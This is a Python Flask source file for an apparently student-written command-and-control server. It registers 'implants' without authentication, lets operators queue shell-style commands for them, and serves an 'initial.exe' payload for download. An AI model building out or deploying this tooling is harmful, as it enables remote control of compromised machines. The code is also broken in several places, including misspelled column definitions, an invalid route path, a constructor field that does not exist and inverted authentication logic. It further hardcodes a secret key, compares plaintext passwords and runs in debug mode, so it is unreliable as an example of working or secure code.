import flask
from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import flask_login
import base64

app = Flask(__name__)
app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'

##############
#  Database  #
##############
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Schema definitions
class Implant(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
	#data to be sent

#Check DB to see if implant exist
def find_implant_by_id(id_):
	return Implant.query.filter_by(id=id_).first()

class Operator(flask_login.UserMixin, db.Model):
	id = db.Column(db.Integer, primary_key=True)
	username = db.Column(db.String, nullable=False, unique=True)
	password = db.Column(db.String, nullable=False)

CREATED = "CREATED"
TASKED = "TASKED"
DONE = "DONE"

class Tasks(db.Model):
	id=db.Column(db.Integer, primary_key=True)
	task_id = db.Column(db.String)
	command_type = db.Column(db.String)
	cmd = db.Column(db.String)
	status = db.Column(db.String)
	implant_id = db.Colum(db.string)


###################
#  Login Manager  #
###################
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

@login_manager.unauthorized_handler
def unauthorized_handler():
	return render_template('unauth.html')

@login_manager.user_loader
def load_user(oid):
    return Operator.query.get(oid)

############################
# Add route to accept file #
############################

##############
#	Routes	 #
##############

# Login route
@app.route('/', methods=['GET', 'POST'])
def login():
	# GET request
	if flask.request.method == 'GET':
		return render_template('login.html')
	# POST request
	username = flask.request.form['username']
	password = flask.request.form['password']
	operator = Operator.query.filter_by(username=username, password=password).first()
	if operator != None:
		# Valid login
		flask_login.login_user(operator, remember=True)
		return redirect('/monitor')
	# Invalid login
	return render_template('unauth.html')

@app.route('/monitor')
@flask_login.login_required
#https://www.digitalocean.com/community/tutorials/how-to-add-authentication-to-your-app-with-flask-login?refcode=49d9dff6b635&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=CopyPaste
#^Might work better that way
def monitor():
	return render_template('monitor.html')

@app.route("tasks/create", methods=["POST"])
@flask_login.login_required
def create_task():
	data = request.json
	if data == None:
		return jsonify({"Status": "Error in task"})
	#Going to add error checking
	task_type = data.get("type")
	task_command= data.get("cmd")
	implant_id = data.get("gid")
	#Check if implant exist 
	implant = find_implant_by_id(implant_id)
	if implant == None or len(implant) == 0:
		return jsonify({"status": "No implant with ID"})
	task = Tasks(
		command_type = task_type,
		cmd = task_command,
		implant_id = implant_id,
	)
	db.session.add(task)
	db.session.commit()
	print(f"[+] A new task has been created for {implant_id}")
	return jsonify({"Status" : "Success", "message": task.id})



@app.route('/register', methods=['POST'])
def register():
	# TODO: Needs error checking, return a proper response
	# Get implant id (iid)
	iid = request.json['gid']
	# Save to database
	password = True
	#Need to add actual authentication, just temperary
	if(password):
		print("Does not have the correct password")
	else:
		return jsonify({"Status": "Failed", "Message" : "Cannot authenticate you are implant!"})
	new_implant = Implant(iid=iid)
	db.session.add(new_implant)
	db.session.commit()
	return jsonify({"Status": "Success", "Message" : "You are implant!"})

@app.route('/initial', methods=['GET'])
def download_implant():
	return send_from_directory(directory=app.root_path, filename='initial.exe')

if __name__ == "__main__":
	app.run(port=5000, debug=True)
